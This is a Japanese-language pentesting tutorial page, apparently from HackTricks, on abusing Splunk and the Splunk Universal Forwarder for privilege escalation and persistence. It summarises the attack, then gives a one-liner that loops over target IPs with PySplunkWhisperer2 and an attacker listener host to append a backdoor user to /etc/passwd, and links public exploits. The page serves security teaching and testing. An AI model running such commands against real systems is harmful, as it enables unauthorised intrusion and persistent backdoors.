# Splunk LPEと永続性

{{#include ../../banners/hacktricks-training.md}}

内部または外部でマシンを**列挙**しているときに**Splunkが実行中**（ポート8090）であることがわかり、運が良ければ**有効な資格情報**を知っている場合、**Splunkサービスを悪用**してSplunkを実行しているユーザーとして**シェルを実行**できます。もしrootが実行している場合、特権をrootに昇格させることができます。

また、**すでにrootであり、Splunkサービスがlocalhostのみでリッスンしていない場合**、Splunkサービスから**パスワード**ファイルを**盗み**、パスワードを**クラッキング**するか、新しい資格情報を追加できます。そしてホスト上で永続性を維持します。

下の最初の画像では、Splunkdのウェブページがどのように見えるかを確認できます。

## Splunk Universal Forwarderエージェントの脆弱性概要

詳細については、投稿を確認してください [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。これは単なる概要です：

**脆弱性の概要:**
Splunk Universal Forwarderエージェント（UF）をターゲットにした脆弱性は、エージェントのパスワードを持つ攻撃者がエージェントを実行しているシステム上で任意のコードを実行できるようにし、ネットワーク全体を危険にさらす可能性があります。

**重要なポイント:**

- UFエージェントは、受信接続やコードの真正性を検証しないため、不正なコード実行に対して脆弱です。
- 一般的なパスワード取得方法には、ネットワークディレクトリ、ファイル共有、または内部文書での発見が含まれます。
- 成功した脆弱性の悪用は、侵害されたホストでのSYSTEMまたはrootレベルのアクセス、データの流出、さらなるネットワーク侵入につながる可能性があります。

**脆弱性の実行:**

1. 攻撃者がUFエージェントのパスワードを取得します。
2. Splunk APIを利用してエージェントにコマンドやスクリプトを送信します。
3. 可能なアクションには、ファイル抽出、ユーザーアカウントの操作、システムの侵害が含まれます。

**影響:**

- 各ホストでSYSTEM/rootレベルの権限を持つ完全なネットワーク侵害。
- 検出を回避するためのログの無効化の可能性。
- バックドアやランサムウェアのインストール。

**悪用のための例コマンド：**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**使用可能な公開エクスプロイト:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Splunkクエリの悪用

**詳細については、投稿を確認してください [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
